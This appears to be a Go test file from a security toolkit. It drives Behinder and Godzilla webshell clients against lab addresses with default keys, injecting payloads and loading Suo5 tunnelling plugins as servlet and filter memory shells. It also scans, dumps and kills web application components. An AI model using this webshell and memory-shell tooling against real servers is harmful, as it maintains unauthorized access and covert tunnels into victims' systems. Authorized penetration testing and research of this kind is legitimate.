package wsm

import (
	"fmt"
	"github.com/davecgh/go-spew/spew"
	"github.com/stretchr/testify/assert"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"regexp"
	"strings"
	"testing"
)

func TestNewWebShell(t *testing.T) {
	url := "http://192.168.3.113:8085/S2-032/bx3.jsp"
	bx := NewWebShell(url, SetBeinderTool(), SetSecretKey("rebeyond"), SetShellScript("jsp"))
	bx.Encoder(func(raw []byte) ([]byte, error) {
		//b := bx.(*Behinder)
		//want := base64.StdEncoding.EncodeToString(raw)
		//return []byte(want), nil
		return raw, nil
	})
	ping, err := bx.Ping()
	if err != nil {
		return
	}
	fmt.Println(ping)
}

func TestInjectSuo5Servlet(t *testing.T) {
	url := "http://127.0.0.1:8080/tomcatLearn_war_exploded/shell.jsp"
	godzillaShell, _ := NewWebShell(url, SetGodzillaTool(), SetPass("pass"), SetSecretKey("key"), SetShellScript("jsp"), SetBase64Aes()).(*Godzilla)
	err := godzillaShell.InjectPayload()
	if err != nil {
		panic(err)
	}
	ping, err := godzillaShell.Ping()
	if err != nil {
		panic(err)
	}
	fmt.Println(ping)
	plugin, err := godzillaShell.LoadSuo5Plugin("go0p", "servlet", "/suo5")
	if err != nil {
		panic(err)
	}

	spew.Dump(plugin)
}

func TestInjectSuo5Filter(t *testing.T) {
	url := "http://127.0.0.1:8080/tomcatLearn_war_exploded/shell.jsp"
	godzillaShell, _ := NewWebShell(url, SetGodzillaTool(), SetPass("pass"), SetSecretKey("key"), SetShellScript("jsp"), SetBase64Aes()).(*Godzilla)
	err := godzillaShell.InjectPayload()
	if err != nil {
		panic(err)
	}
	ping, err := godzillaShell.Ping()
	if err != nil {
		panic(err)
	}
	fmt.Println(ping)

	plugin, err := godzillaShell.LoadSuo5Plugin("go0p", "filter", "/*")
	if err != nil {
		panic(err)
	}

	spew.Dump(plugin)
}

func TestInjectWebappComponent(t *testing.T) {
	url := "http://127.0.0.1:8080/tomcatLearn_war_exploded/shell.jsp"
	godzillaShell, _ := NewWebShell(url, SetGodzillaTool(), SetPass("pass"), SetSecretKey("key"), SetShellScript("jsp"), SetBase64Aes()).(*Godzilla)
	err := godzillaShell.InjectPayload()
	if err != nil {
		panic(err)
	}
	ping, err := godzillaShell.Ping()
	if err != nil {
		panic(err)
	}
	fmt.Println(ping)

	plugin, err := godzillaShell.LoadScanWebappComponentInfoPlugin("memshellScan")
	if err != nil {
		panic(err)
	}

	plugin, err = godzillaShell.ScanWebappComponentInfo()
	if err != nil {
		panic(err)
	}
	spew.Dump(plugin)
	assert.True(t, strings.Contains(string(plugin), "b3JnLmFwYWNoZS5qYXNwZXIuc2VydmxldC5Kc3BTZXJ2bGV0"))

	plugin, err = godzillaShell.DumpWebappComponent("com.example.HelloServlet")
	pattern := regexp.MustCompile(`"classBytes":\s*"([^"]+)"`)
	plugin = pattern.FindSubmatch(plugin)[1]
	if err != nil {
		panic(err)
	}

	plugin, _ = codec.DecodeBase64(string(plugin))
	plugin = []byte(codec.EncodeToHex(plugin))

	spew.Dump(plugin)

	assert.True(t, strings.Contains(string(plugin), "cafebabe"))

	plugin, err = godzillaShell.KillWebappComponent("filter", "HelloFilter")
	if err != nil {
		panic(err)
	}
	spew.Dump(plugin)
	assert.True(t, strings.Contains(string(plugin), "success"))

}
